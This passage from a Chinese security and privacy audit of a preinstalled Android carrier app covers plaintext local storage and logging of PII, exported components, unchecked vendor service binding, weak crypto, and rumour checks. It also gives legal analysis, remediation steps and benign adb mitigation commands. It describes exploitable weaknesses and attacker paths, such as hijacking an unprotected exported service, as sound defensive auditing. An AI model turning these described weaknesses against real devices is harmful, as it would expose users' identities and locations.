轮换签名密钥（应用专用、非 CA、SHA-256）；评估 `sharedUserId` 必要性（Android 10+ 已不推荐，13 起逐步限制）；私有数据加密存储以降低"同 UID 互读"的后果。

---

## 6.8 S-05｜敏感数据明文落盘【高】

**CVSS 3.1 近似 5.9**：`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

### 6.8.1 证据

```java
// b.c.a.b.d —— history
sQLiteDatabase.execSQL("create table history(id integer primary key autoincrement, jsonString text)");
contentValues.put("jsonString", str);          // 明文完整 PII，上限 100 条

// b.c.a.b.m —— signal
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }     // 明文，上限 500 条

// b.c.a.b.l —— SharedPreferences
context.getSharedPreferences("com_mobiletools_systemhelper_preference", 4);   // MODE_WORLD_READABLE
```

### 6.8.2 问题清单

| 问题 | 说明 |
|---|---|
| 数据库无加密 | 完整 PII 明文；root/调试包/取证镜像可直接读取 |
| `MODE_WORLD_READABLE`（4） | 全局可读标志；Android 4.3+ 部分版本会抛 `SecurityException`，旧内核/定制 ROM 上确实全局可读 |
| 无 TTL | 上传成功才清表，长期失败将累积满额 |
| `onUpgrade` 空实现 | 版本升级静默丢表或残留脏数据 |
| 硬编码路径删除 | `new File("/data/data/com.mobiletools.systemhelper/shared_prefs/...")`，多用户/多开环境失效 |

**配置正确项**：`allowBackup="false"` 阻断了 `adb backup` 导出路径。

### 6.8.3 修复

SQLCipher 或 Keystore 派生密钥加密；改 `MODE_PRIVATE`；设置 TTL 与容量上限；上传成功即 `secure_delete`。

---

## 6.9 S-06｜明文 PII 写 logcat，且开关可远程打开【高】

**CVSS 3.1 近似 6.6**：`AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

### 6.9.1 证据

```java
// control.g —— 上报线程
j.a("RegisterThread", "register postString：" + strA);        // 完整明文 JSON

// b.c.a.a.f1
j.a("DeviceManager", "Clear Text mDeivceInfo:" + cVar.a());   // 完整明文 JSON
j.a("DeviceManager", "appInfo:" + jSONArray.toString());      // 全量应用清单
```

### 6.9.2 两个加重情节

1. **开关默认关闭，但可被外部打开** —— 通过 S-01 的 `a(boolean)`，任意应用可将其置为 true；
2. **无脱敏** —— IMEI/IMSI/手机号完整输出，未做掩码。

日志输出受 `f.f599a` 控制，而该开关可以通过 Binder 远程修改：

```java
// b.c.a.b.j
public static void a(String str, String str2) {
    if (!f.f599a || str == null || str2 == null) {
        return;
    }
    ...
    Log.d(str, str2);
}
```

### 6.9.3 可利用场景

售后维修、USB 调试、取证、具备 `READ_LOGS` 的旧版系统、恶意无障碍服务配合截屏。

### 6.9.4 修复

Release 构建用 R8 移除日志调用（而非运行时开关）；必须保留时强制脱敏（仅保留后 4 位）；禁止通过 Binder 修改日志开关。

---

## 6.10 S-07｜组件导出面过宽【中】

### 6.10.1 TestActivity

```xml
<activity android:name="com.mobiletools.systemhelper.Activity.TestActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.activity.testactivity"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

- 任意应用可 `startActivity` 拉起 → 弹出系统权限申请框，构成**权限诱导/社工钓鱼**载体；
- 界面 `tv_device_info` 直接展示 `c.b(ctx)` 生成的完整设备信息 JSON，可被截屏或无障碍服务读取；
- 命名含 `Test`，属**遗留调试入口**，不应存在于生产包。

### 6.10.2 三个导出的 Receiver

`OnBootReceiver`、`SIMStateReceiver`、`ConnectStateReceiver` 均导出且无权限。虽然 `BOOT_COMPLETED`、`CONNECTIVITY_CHANGE`、`SIM_STATE_CHANGED` 都是 protected broadcast，普通应用无法直接伪造，但：

- 通过 `PendingIntent` 复用与隐式 Intent 组合，仍存在触发路径；
- 反复触发造成**电量与流量消耗**（每次触发都重建采集线程）；
- `SIMStateReceiver` 内部 `unregisterReceiver` 使用静态 Context，存在 `IntentReceiverLeaked` 风险。

### 6.10.3 修复

`TestActivity` 下线；所有 Receiver 改 `exported="false"`（系统广播无需导出）。

---

## 6.11 S-08｜私有 AIDL 与隐藏 API 依赖，绑定前不校验签名【中】

### 6.11.1 证据

```java
// RegisterIntentService
intent.setComponent(new ComponentName("com.android.phone",
        "com.android.phone.nubia.NBExtTelephonyService"));        // 努比亚
intent.setComponent(new ComponentName("com.gree.telephonymanager",
        "com.gree.telephonymanager.GreeTelephonyManagerService")); // 格力
context.bindService(intent, conn, 1);        // 未校验目标包签名
```

### 6.11.2 问题

| 问题 | 说明 |
|---|---|
| 绑定前不校验签名 | 同名组件可被冒名劫持（低版本 Android），返回伪造双卡数据 |
| 依赖非公开接口 | `ITelephonyEx`、`TelephonyManagerEx`、`ColorOSTelephonyManager`、`HwTelephonyManager`、`MzTelephonyManager` —— ROM 升级即失效 |
| 隐藏 API 反射 | `Class.forName("android.os.SystemProperties")` 读 `ro.*`（含 `ro.bd.cmcc_*`、`ro.bird.*` 等定制字段） |
| 异常处理薄弱 | 反射失败仅 `printStackTrace`，字段为空仍上报 |
| **空转等待无超时** | 见下 |

### 6.11.3 一个会挂死线程的写法

```java
while (f.A == null) {
    Thread.sleep(5);          // 无超时、无中断检查
}
```

`RegisterIntentService.onHandleIntent` 中，若厂商私有 Binder 永远不可用，工作线程将**永久阻塞**，且不会自愈。

### 6.11.4 修复

绑定前校验 `PackageManager` 签名；对私有接口做能力降级；为等待逻辑加超时与中断检查；将 `SystemProperties` 依赖改为 `Build` 公开字段。

---

## 6.12 S-09｜无完整性校验，可任意重打包【中】

- 无 APK 签名自校验、无 DEX 完整性校验、无加固；
- 修改默认 `serverAddress`、替换上报域名后重打包可直接生效；
- 更糟的是：**因为 S-01 的存在，连重打包都不需要** —— 运行时改一个字符串即可。

---

## 6.13 S-10｜弱摘要与密钥管理【低】

- v1 签名使用 `SHA1withRSA`（v2/v3 可缓解降级攻击）；
- 应用签名证书有效期 28 年，上报公钥证书 100 年，均远超合理轮换周期；
- 无密钥版本管理机制。

---

## 6.14 S-11｜代码缺陷【低】

| 位置 | 缺陷 | 后果 |
|---|---|---|
| `b.c.a.b.c` | `if ("3.0" != 0)` 字符串与整数比较 | 恒真，逻辑失效 |
| `b.c.a.a.c#a` | `if (i3>=26){...} else if (i3>=30){...}` | 第二分支永不可达，SDK≥30 逻辑被遮蔽 |
| `control.e#b()` | `listA` 可能为 null 后直接 `.iterator()` | 潜在 NPE |
| `control.g#a(boolean)` | 方法体为空 | 上报结果未处理 |
| `b.c.a.b.b#d(long)/j(long)` | 空实现 | `totalData1/2` 恒为 0，数据失真 |
| `b.c.a.b.d#onUpgrade` | 空实现 | 升级静默丢表 |
| `b.c.a.b.l#a()` | 硬编码绝对路径删除 | 多用户/多开环境失效 |
| `control.f` | 只重写构造函数，未重写 `run()` | `RegType=R`（信号上报）路径实际不生效 |
| `control.b` | 对 `String.valueOf(lastKnownLocation) != strA` 用 `!=` 比较字符串 | 恒为 true，导致重复注册定位监听 |

---

## 6.15 S-12｜外部输入无校验【低】

```java
// b.c.a.b.e —— GET /public/ip
String ip = new b.c.a.b.e().a();

// f1.b 回调中直接使用
cVar.C = str;      // 写入上报字段 IPv4，无格式校验、无长度限制
```

明文 HTTP 下中间人可注入任意字符串，污染上报数据，亦可作为注入向量（若服务端未校验）。

---

## 6.16 攻击者画像与利用成本

| 攻击者 | 能力 | 可达成 | 成本 |
|---|---|---|---|
| **普通恶意应用（零权限）** | 绑定导出服务 | 劫持全量上报数据（S-01） | **极低**（约 30 行代码） |
| 同链路中间人 | 抓包 / 劫持 DNS | 获取密文 + 可推导密钥（S-02+S-03） | 低（公共 Wi-Fi） |
| 持有平台签名密钥者 | 签发同签名 APK | 同 UID 读取明文库、继承权限（S-04） | 中（需密钥） |
| 物理接触者（维修/取证） | root / 调试 | 读取明文数据库与日志（S-05+S-06） | 中 |
| 供应链攻击者 | 重打包 | 替换上报地址、植入后门（S-09） | 中 |

---

# 第 7 章 两层耦合：为什么 1+1 > 2

单看任一层都已是严重问题，真正危险的是**乘数效应**：

| 隐私问题 | × 安全缺陷 | = 放大后的后果 |
|---|---|---|
| P-02 采集 39 字段的身份与行为数据 | S-01 通道可被任意应用改写 | 任意小工具都能定向收割百万用户的实名身份 + 位置 + 行为画像 |
| P-02 采集 IMEI/IMSI/ICCID | S-02 明文传输 + S-03 密钥可推导 | 数据在链路上等同裸奔 |
| P-03 静默周期回传 | S-01 + S-06 开关可远程打开 | 攻击者同时获得"持续数据流"与"本地明文副本" |
| P-06 本地明文留存（600 条） | S-04 平台密钥 + sharedUserId | 二手设备/同 UID 应用可还原前机主完整身份与轨迹 |
| P-05 用户无法关闭 | S-07 组件导出 | 用户既不能自己关，也无法阻止他人利用 |
| P-02 应用画像 | S-01 通道劫持 | 攻击者可对特定人群（如某类疾病患者）做定向筛选 |

**一句话**：层面一让"数据过度集中"，层面二让"集中后的数据不可信地流动"。两者叠加，使这个应用实质上成为一个**运行在用户设备上、由任意第三方可控的敏感数据采集终端**。

---

# 第 8 章 外部传言核查

针对"该应用会录屏""上传手机上所有 APK"两项外部说法，做了全量逐类反编译复核。独立报告见 `核实报告_录屏与APK上传.md`。

## 8.1 结论速览

| 指控 | 判定 | 一句话依据 |
|---|---|---|
| 对用户录屏 | **不属实** | 录屏四环节（授权/采集/编码/传输）证据链**全部断裂** |
| 上传所有 APK 包名 | **属实** | `getInstalledApplications(0)` + `pkgName`，7 天一次 |
| 上传 APK 文件本体 | **不属实** | 无文件读取、无 multipart，body 恒为单个 JSON |

## 8.2 录屏：四环节逐项取证

Android 上实现录屏必须打通四个环节，任一环节缺失即不成立。

### 环节 1：获取录屏授权（MediaProjection）

| 检查项 | 结果 |
|---|---|
| `MediaProjectionManager` / `MediaProjection` | **0 命中** |
| `createScreenCaptureIntent()` | **0 命中** |
| `FOREGROUND_SERVICE` / `FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION` | **Manifest 中不存在** |
| MediaProjection 前台服务组件 | **不存在**（仅 3 个 Service，均与电话/注册相关） |

Android 5.0+ 录屏必须由用户在弹出的系统对话框中明确授权，Android 10+ 强制要求前台服务 + 常驻通知。本应用既无授权调用，也无前台服务 —— **用户从未见过任何录屏授权弹窗**。

### 环节 2：采集屏幕画面

| 可能路径 | 检查结果 |
|---|---|
| `VirtualDisplay` + `ImageReader` | **0 命中** |
| `SurfaceControl` / `ScreenshotClient`（系统隐藏 API） | **0 命中** |
| `PixelCopy` / `DisplayManager` / `getDisplay()` | **0 命中**（唯一的 `getDisplay` 命中是 `getDisplayMetrics`，UI 密度计算） |
| `MediaRecorder` + `Surface` | **0 命中** |
| AccessibilityService + `takeScreenshot` | **0 命中**，Manifest 无 `BIND_ACCESSIBILITY_SERVICE` |
| `/dev/graphics/fb0` 直接读帧缓冲 | **0 命中** |
| root 执行 `screencap` / `screenrecord` | `Runtime.exec` / `ProcessBuilder` / `/bin/sh` **全部 0** |

**`Bitmap` 与 `Canvas` 的 6 次命中归属**：

| 命中类 | 实际身份 |
|---|---|
| `android.support.v4.graphics.drawable.*` | 库：图标着色 |
| `android.support.v7.widget.*` | 库：控件绘制 |
| `a.b.b.a.h` / `a.b.b.a.i` | 库：Drawable 包装（`setFilterBitmap` 转发） |
| `a.b.d.c.a.c` | 库：Drawable 包装（`draw(Canvas)` 转发） |

无一处位于自有业务代码，且全部是 Drawable 转发，**不产生屏幕捕获**。

### 环节 3：编码与落盘

| 检查项 | 结果 |
|---|---|
| `mp4` / `video/` / `MediaRecorder` / `MediaCodec` | **全部 0** |
| `getExternalFilesDir` / `openFileOutput` | **0** |
| `FileOutputStream` 唯一命中 | `a.b.c.b.i` = **TypefaceCompatUtil**（复制字体资源到缓存） |

录屏必然产生持续视频流或文件，本应用没有任何视频编码或媒体写入能力。

### 环节 4：传输

| 检查项 | 结果 |
|---|---|
| `multipart` / `boundary` / `filename` / `Content-Disposition` | **全部 0** |
| `application/octet-stream` | **0** |
| 实际形态 | 单个 POST，body 为 AES 加密的 JSON |

即使假设存在录屏数据，也没有任何文件上传通道可以把它送出去。

### 判定

**四个环节全部断裂，且不存在动态加载或 native 库的绕过路径 → "该应用会对用户录屏"不属实。**

## 8.3 上传 APK：部分属实

### 8.3.1 属实部分：包名与元数据

```java
// control.e#b()
PackageManager pm = context.getPackageManager();
List<ApplicationInfo> installed = pm.getInstalledApplications(0);   // 全部已安装应用
List<UsageStats> stats = usageStatsManager.queryAndAggregateUsageStats(t0, t1);

// b.c.a.b.b#a()
jSONObject.put("appLabel", ...);   jSONObject.put("pkgName", ...);
jSONObject.put("runTime", this.c + "min");
jSONObject.put("tx1", ...);  jSONObject.put("rx1", ...);
jSONObject.put("tx2", ...);  jSONObject.put("rx2", ...);
jSONObject.put("totalData1", ...);  jSONObject.put("totalData2", ...);
jSONObject.put("totalDataWiFi", ...);
```

汇总为 `AppInfo[]`，随 JSON 上报，**周期 7 天**。

**判定：属实，且比传言更严重** —— 不只是包名，还包括应用名、使用时长、分卡流量。

### 8.3.2 不属实部分：APK 文件本体

| 检查项 | 结果 |
|---|---|
| `ApplicationInfo.sourceDir` / `publicSourceDir` | **0** |
| `getPackageArchiveInfo` / `PackageParser` | **0** |
| `ZipFile`（打开 APK 需用） | **0** |
| 遍历 `/data/app` | **0** |
| `.apk` 字符串 | 0 处有效命中（`grep` 的 1 次是正则误报） |

配合环节 4：传输层只支持单个 JSON body。**"上传 APK 文件"在采集端与传输端同时不成立。**

## 8.4 为什么"不属实"这一判定强度较高

DEX 格式要求任何方法调用都在 `method_ids` 中登记，而 `method_ids` 引用 `string_ids` 中的类名。因此只要调用了某个 API，其类名字符串必然出现在 `classes.dex` 中 —— **除非动态加载 dex 或使用 native 库**，这两条路径均已验证为空：

| 绕过方式 | 检查项 | 结果 |
|---|---|---|
| 动态加载 | `DexClassLoader` / `PathClassLoader` / `InMemoryDexClassLoader` / `dalvik/system` / 插件框架 | **全部 0** |
| native 库 | `.so` 数量、`loadLibrary` | **0 个 .so，0 次调用** |

补充：`Class.forName` 全包仅 1 处，加载目标为 `SystemProperties` 与各类 `TelephonyManager`，**无一个是显示/图像相关类**。

## 8.5 为什么会出现"录屏"传言

三种可能性较大（均为推测，非结论）：

1. **与其他预装组件混淆** —— 运营商定制机常同时预装"远程协助/远程客服"类应用，那类具备屏幕共享能力，但属另一个 APK；
2. **把 `SignalInfo` 的定位采集误读为"监控"** —— 该字段确实含经纬度，但性质是位置采集，不是屏幕采集；
3. **把 `getInstalledApplications` 误读为"上传 APK"** —— 看到枚举全部应用，进一步推断"把 APK 也传走了"，实际只传元数据。

## 8.6 核查过程中对主报告的 4 处修正

逐类反编译后，发现初版报告有 4 处判断需要修正 —— **3 处加重、1 处减轻**。

### 8.6.1 【加重】存在真实的 GPS 定位采集

```java
// control.b#onSignalStrengthsChanged()
if (b.c.a.b.f.e) {                                     // SignalInfo 开关
    LocationManager lm = (LocationManager) ctx.getSystemService("location");
    Location last = lm.getLastKnownLocation("fused");
    strA = a(last);                                     // "经度：x 纬度：y 高度：z 速度：… 方向：… 精度：…"
    lm.requestLocationUpdates("fused", 1000L, 10.0f, new a(lm));   // 1 秒 / 10 米
    jSONObject.put("location", strA);                   // ← 明文经纬度
    m.a(ctx, ...).a(jSONObject.toString());             // 写入 signal 库
}
```

**初版判断"未见主动定位调用，`ACCESS_FINE_LOCATION` 疑似冗余"—— 该判断错误。**

但需同时说明：该路径受 `b.c.a.b.f.e` 控制，`e` 默认 `false`，全包**未发现将其置为 `true` 的路径**。即：**能力存在，默认未激活**；激活条件可能由定制 ROM 或服务端下发控制 `[C]`。

### 8.6.2 【加重】存在第二个明文数据库，容量更大

```java
// b.c.a.b.m
public static String c = "signalhelper";   // 库名
public static String d = "signal";          // 表名
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }  // 上限 500 条
```

初版只覆盖了 `systemhelper/history`（100 条），实际还有 `signalhelper/signal`（**500 条**），存 RSRP/SINR + cellid + LAC + 时间 + **经纬度**，同样无加密。

### 8.6.3 【加重】还采集内存与存储容量

```java
// b.c.a.b.i#c()
jSONObject.put("RAM", strD);
jSONObject.put("ROM", strE);
jSONObject.put("FREE", strA);
```

读 `/proc/meminfo` + `StatFs`，被 **18 个适配器**调用，结果写入 `SubType` 字段。

### 8.6.4 【减轻】部分机型存在真实的同意门控

详见 5.2.5。初版"`f.g` 默认 true 且全包无交互路径"**过于绝对**；准确说法是 8 个适配器有真实同意、19 个弱门控、其余无门控。

### 8.6.5 修正汇总

| # | 初版表述 | 修正后 | 方向 |
|---|---|---|---|
| 1 | 未见主动定位调用 | 存在 fused 定位（1s/10m），受默认关闭的 `f.e` 控制 | 加重 |
| 2 | 本地明文库 100 条 | 另有 `signal` 库 500 条，含经纬度 | 加重 |
| 3 | 采集字段 39 项 | 另有 RAM/ROM/FREE 经 `SubType` 上报 | 加重 |
| 4 | `f.g` 默认 true，全包无交互路径 | 8 个适配器有真实同意门控，19 个弱门控 | 减轻 |

## 8.7 本次核查的边界

1. **不能排除同设备上的其他预装组件** —— 本报告只针对这一个 APK。若传言指整机行为，需逐个分析其他预装应用。
2. **不能排除服务端动态配置** —— `f.e`（GPS 开关）、`f.d`（小米动态机型匹配）在包内未找到置真路径，若服务端下发配置打开，8.6.1 的能力会被激活 `[C]`。
3. **不能排除定制 ROM 分支版本** —— 本样本为 `1.2-20221110`，厂商可能为不同机型编译不同变体。
4. **未做动态验证**。

---

# 第 9 章 法律责任分析

| 责任层级 | 可能性 | 说明 |
|---|---|---|
| **民事侵权** | **很高** | 侵权四要件已具备（见 5.13），可诉请停止侵害、删除、赔偿 |
| **行政违法** | **很高** | 违反个保法与工信部规章，可由网信/工信部门处罚 |
| **刑事犯罪** | **现有证据不足** | 缺少"出售/提供/非法获取"的证据，不宜认定 |

## 9.1 行政违法的主要依据

| 规范 | 条款 | 违反点 | 后果 |
|---|---|---|---|
| 个人信息保护法 | 第 6/13/17/29/51 条 | 超范围、无基础、未告知、未单独同意、无安全措施 | **第 66 条**：责令改正、警告、没收违法所得；拒不改正处 100 万元以下罚款；**情节严重处 5000 万元以下或上年度营业额 5% 以下罚款**，可责令暂停相关业务、停业整顿、吊销许可；直接责任人处 10 万–100 万元 |
| 工信部 24 号令《电信和互联网用户个人信息保护规定》 | 第 8、9 条 | 未公布收集规则、未经同意收集 | 责令改正、行政处罚 |
| 《移动智能终端应用软件预置和分发管理暂行规定》（信管〔2016〕407 号） | 第 6、7 条 | 未经同意收集、预置应用不可卸载 | 责令改正 |

## 9.2 可能的抗辩与评估

| 抗辩 | 评估 |
|---|---|
| "属基本功能软件，通信必需" | 部分成立，能覆盖 7 个设备属性字段，**覆盖不了 32 个**（应用画像、基站、手机号与通信功能运转无因果关系） |
| "履行《网络安全法》第 21 条义务" | 不成立。该条要求留存**网络日志**，不含已安装应用清单与基站轨迹 |
| "已告知（文案在资源里）" | 不成立且适得其反。文案无展示路径；法律要求"以显著方式告知"，不是"编译进 APK" |
| "用户已同意（默认开启）" | 不成立。默认同意不构成"自愿、明确"的意思表示；且属一揽子同意 |
| "部分机型有系统级同意开关" | 部分成立（8 个适配器），但不能覆盖多数机型，且不满足"单独同意"要求 |

## 9.3 为何刑事路径目前走不通

刑法第 253 条之一要求"违反国家有关规定，**向他人出售或者提供**公民个人信息"或"**非法获取**"。

本应用是运营商在自家定制机上预装、采集后传至自家服务器，从代码看属"自采自用"，无第三方接收方证据。

**但需说明**：若查实数据被共享给第三方，或服务器被入侵导致泄露，性质会立即改变 —— 可能触及第 253 条之一，甚至第 285 条（非法获取计算机信息系统数据）。

---

# 第 10 章 修复路线

## 10.1 隐私层面

| 优先级 | 措施 | 对应 | 工作量 |
|---|---|---|---|
| P0 | 删除 `AppInfo[]` 与 `SignalInfo` 采集，移除基站字段 | P-02 | 3 人日 |
| P0 | IMEI/IMSI/ICCID/MSISDN 改哈希或脱敏 | P-02 | 2 人日 |
| P0 | 完整隐私政策 + 敏感项单独同意 + 拒绝后降级可用 | P-01 | 5 人日 |
| P1 | 提供采集开关，绑定 `f.g` 到用户选择，支持撤回 | P-01, P-05 | 2 人日 |
| P1 | 明确告知接收方、用途、期限、共享与跨境 | P-04 | 1 人日 |
| P1 | 移除强制开启 VoLTE 的写操作 | P-07 | 0.5 人日 |
| P1 | 两个数据库加密 + TTL + 上传后安全删除 | P-06 | 2 人日 |
| P2 | 建立查询/删除/导出渠道 | P-05 | 3 人日 |
| P2 | 取消穿透 Doze 的精确闹钟，改 `WorkManager` | P-03 | 1 人日 |
| P2 | 未成年人场景建立年龄识别与监护人同意 | P-08 | 2 人日 |

## 10.2 安全层面

| 优先级 | 措施 | 对应 | 工作量 |
|---|---|---|---|
| P0 | `RegisterHelperService` 改 `exported="false"` 或加权限 + UID 校验 | S-01 | **0.5 人日** |
| P0 | `serverAddress` 白名单强校验 + HMAC | S-01 | 1 人日 |
| P0 | 全链路 HTTPS + 证书固定 + 关闭明文流量 | S-02 | 2 人日 |
| P0 | 重构加密：AES-256-GCM + 随机会话密钥 + RSA-OAEP，换 2048 位密钥 | S-03 | 3 人日 |
| P1 | Release 移除明文日志；禁止 Binder 改开关 | S-06 | 1 人日 |
| P1 | 两个 SQLite 加密 + `MODE_PRIVATE` | S-05 | 2 人日 |
| P2 | 下线 `TestActivity`；Receiver 全部 `exported="false"` | S-07 | 1 人日 |
| P2 | 绑定厂商服务前校验签名；等待逻辑加超时 | S-08 | 2 人日 |
| P2 | 增加签名自校验 | S-09 | 2 人日 |
| P3 | 密钥轮换（应用证书 + 上报公钥） | S-04, S-10 | 需厂商配合 |
| P3 | 修复 S-11 所列缺陷 | S-11 | 1 人日 |

> **投入产出比最高的是 S-01：0.5 人日即可消除危害最高的一条链路，应作为绝对第一优先。**

## 10.3 修复优先级建议

```
第一周   S-01（0.5d）+ S-02（2d）+ serverAddress 校验（1d）      → 消除 60% 风险
第二周   S-03 加密重构（3d）+ S-06 日志（1d）                    → 再消除 15%
第三至四周 P-02 采集收敛（5d）+ P-01 告知同意（5d）               → 再消除 20%
后续     P-06 / S-05 / S-07 / S-08 / S-09 等                      → 收尾
```

---

# 第 11 章 用户侧缓解措施

厂商修复前，用户可尝试（效果取决于 ROM 与权限）：

| 措施 | 命令 / 操作 | 可行性 |
|---|---|---|
| 查看是否预装 | `adb shell pm list packages -s \| grep systemhelper` | ✅ |
| 尝试停用 | `adb shell pm disable-user --user 0 com.mobiletools.systemhelper` | ⚠️ 系统应用常被拒 |
| 撤销运行时权限 | `adb shell pm revoke com.mobiletools.systemhelper android.permission.READ_PHONE_STATE` | ⚠️ 部分机型重启后恢复 |
| 关闭"运营商服务改进计划" | 设置 → 隐私/安全 → 相关开关（仅部分机型生效） | ✅ vivo/百度定制机有效 |
| 禁止后台联网 | 设置 → 应用 → 流量管理 | ⚠️ 视 ROM |
| 第三方防火墙 | NetGuard / AFWall+（需 root） | ✅ 阻断上报（但本地采集仍在进行） |
| 关闭"闹钟和提醒"权限 | 设置 → 应用 → 特殊权限 | ⚠️ 降低唤醒频率 |
| 二手转卖前 | 恢复出厂设置 | ✅ 清除本地残留（600 条） |

**必须告知用户的一点**：以上措施均**不能**撤回已上传至服务端的历史数据。若需行使删除权，须通过运营商客服渠道正式提出。

---

# 第 12 章 结论

## 12.1 隐私层面

这个应用的设计定位就是"静默、持续、全覆盖"地采集用户数据。它留下了一段残缺的告知文案，却没有展示给任何人；它设置了一个用户许可开关，却只在少部分机型上真正生效。

十项法定权利实现度为零，六种合法性基础无一成立。这不是"合规瑕疵"，而是**采集模型本身与个人信息保护框架不兼容**。

## 12.2 安全层面

一个未加防护的导出服务、一条明文 HTTP 链路、一套密钥可由明文推导的"伪加密"、一颗平台级 CA 密钥，共同构成**结构性的信任崩塌**。最严重的一条利用成本几乎为零，而它控制的恰好是最敏感的数据通道。

## 12.3 两者的关系

不是"因为不安全才导致隐私问题"，也不是"因为采集过度才显得不安全" —— 而是**两个缺陷在同一条数据链路上首尾相接**：前端无限度地采，后端无防护地送。任何一环单独修复都不够。

## 12.4 关于外部传言

"会录屏"不属实 —— 这个判定不是"没扫到"，而是四环节证据链全断、且不存在绕过静态分析的路径。

"上传所有 APK 包名"属实。但比传言更值得关注的是另一件事：**这个应用里存在真实的 GPS 定位采集代码，只是被一个默认关闭的开关挡住了**。那个开关由谁打开、能不能被远程打开，是比"录屏"更值得追问的问题。

## 12.5 一句话建议

> 把 S-01 改掉（0.5 人日），把 P-02 收掉（5 人日），把 S-02/S-03 重建（5 人日）—— **不到两周的工作量，可以消除这份报告里 80% 的风险**。

---

# 附录

## 附录 A｜核心代码索引

### A.1 包族语义

| 包族 | 性质 | 类数 |
|---|---|---|
| `com.mobiletools.systemhelper.*` | **业务层（类名未混淆）** | 30 |
| `b.c.a.a.*` | 设备信息读取器 + 厂商适配器 | 59 |
| `b.c.a.b.*` | 基础设施（加密/HTTP/SQLite/日志/SP） | 15 |
| `b.a.b.a.*` / `b.b.a.*` | 厂商私有 AIDL（格力/努比亚） | 7 |
| `android.support.*` / `android.arch.*` / `androidx.*` / `a.b.*` / `a.a.a.*` | 第三方库（含被 R8 重命名的 AppCompat） | ~704 |

### A.2 `b.c.a.b.*` 单字母类对照

| 类 | 功能 |
|---|---|
| `a` | AlarmManager 调度器（4 个入口，均自循环） |
| `b` | AppInfo 单项模型 |
| `c` | 加密（MD5 / AES-ECB / RSA 入口） |
| `d` | SQLite（`systemhelper` / `history`，100 条） |
| `e` | HTTP GET（取公网 IP） |
| `f` | **全局常量与状态**（URL、周期、开关） |
| `g` | **HTTP POST**（上报） |
| `h` | 字段脱敏（仅非联通卡启用） |
| `i` | 内存/存储采集（RAM/ROM/FREE） |
| `j` | 日志封装 |
| `k` | RSA（读 `pub.cer`） |
| `l` | SharedPreferences 封装 |
| `m` | SQLite（`signalhelper` / `signal`，500 条） |
| `n` | 信号数据模型（3 字段） |
| `o` | 反射工具（Class.forName + getDeclaredMethod） |

### A.3 关键位置速查

| 环节 | 类 / 方法 | 行号 | 关键语句 |
|---|---|---|---|
| 明文 JSON | `control.c#a()` | — | 39 次 `jSONObject.put(...)` |
| 明文日志 | `control.g#a(c)` | **33** | `"register postString：" + strA` |
| MD5 | `control.g#a(c)` | **36** | `b.c.a.b.c.a(strA)` |
| RSA 签名 | `control.g#a(c)` | **37** | `c.a(c.a(ctx, bArrA))` |
| URL 拼接 | `control.g#a(c)` | **38** | `l.c(ctx) + "?ver=3.0&..."` |
| AES 加密 | `control.g#a(c)` | **39** | `c.a(strA, bArrA)` |
| POST | `control.g#a(c)` | **42** | `gVar.a(str, bArrA2, bArrA)` |
| 用户许可 | `control.g#run()` | **123** | `if (b.c.a.b.f.g)` |
| AES 原语 | `b.c.a.b.c#a(String,byte[])` | **43** | `AES/ECB/PKCS5Padding` |
| 常量 | `b.c.a.b.f` | **20,36-39** | `g=true`、URL、24h、7d |
| 导出服务 | `RegisterHelperService` | **24-49** | 5 个 Binder 方法 |
| 开机延迟 | `OnBootReceiver#onReceive` | — | `b(f611a, 240000L)` |
| Doze 穿透 | `b.c.a.b.a` | — | `setExactAndAllowWhileIdle` |
| 应用画像 | `control.e#b()` | — | `getInstalledApplications(0)` |
| IMEI/IMSI | `b.c.a.a.c#b(Context,c)` | — | `getImei(0/1)`、`getSubscriberId()` |
| 基站 | `b.c.a.a.c#a(Context,int,c)` | — | `CellIdentityLte.getCi()/getTac()` |
| GPS 采集 | `control.b#onSignalStrengthsChanged` | — | `requestLocationUpdates("fused",1000L,10.0f,…)` |
| VoLTE 强改 | `b.c.a.a.c#a(Context,int)` | — | `setAdvancedCallingSettingEnabled(true)` |

### A.4 JADX 搜索关键词

| 想找 | 搜索框输入 | 命中 |
|---|---|---|
| 上报地址 | `dm.wo.com.cn` | `b.c.a.b.f`（全包唯一） |
| 上报线程 | `register postString` | `control.g` |
| 明文日志 | `Clear Text` | `b.c.a.a.f1#c` |
| 加密算法 | `AES/ECB` | `b.c.a.b.c` |
| 导出服务 | `registerhelper Service onBind` | `RegisterHelperService` |
| 开机延迟 | `boot delayed for 4 minutes` | `OnBootReceiver` |
| 强制 VoLTE | `before open:false` | `b.c.a.a.c` |
| GPS 采集 | `requestLocationUpdates` | `control.b` |
| 同意门控 | `operator_service_improve_plan` | 6 个适配器 |

### A.5 命令行定位

```bash
grep -abo "dm.wo.com.cn" apk_raw/classes.dex
grep -aoE "https?://[^\s\"']{4,120}" apk_raw/classes.dex | sort -u
dexdump -d apk_raw/classes.dex | grep -B20 "Lcom/mobiletools/systemhelper/control/g;"
```

## 附录 B｜815 类审查清单

| 包族 | 类数 | 性质 | 审查方式 | 结论 |
|---|---|---|---|---|
| `b.c.a.a` | 59 | 设备信息读取器 + 厂商适配器 | 逐类反编译 | 均为电话信息读取与反射调用，**无屏幕/文件读取能力**；8 个有同意门控 |
| `b.c.a.b` | 15 | 基础设施 | 逐类反编译 | 加密/HTTP/SQLite/日志/SP/内存采集/反射，**无屏幕采集** |
| `com.mobiletools.systemhelper` | 30 | 业务层 | 逐类反编译 | 采集调度与上报，**无屏幕采集**；`control.b` 含 GPS 采集 |
| `b.a.b.a` / `b.b.a` | 7 | 厂商 AIDL | 逐类反编译 | 仅电话扩展接口 |
| `a.a.a.*` | 10 | AppCompat（R8 重命名） | 抽样确认 | 公开库原码 |
| `a.b.a.*` / `a.b.b.*` / `a.b.c.*` / `a.b.d.*` | ~180 | **AppCompat / AndroidX（R8 重命名）** | 抽样确认（`a.b.c.a.a`=ContextCompat、`a.b.c.g.a`=AbsSavedState、`a.b.d.a.a`=R.styleable） | 公开库原码 |
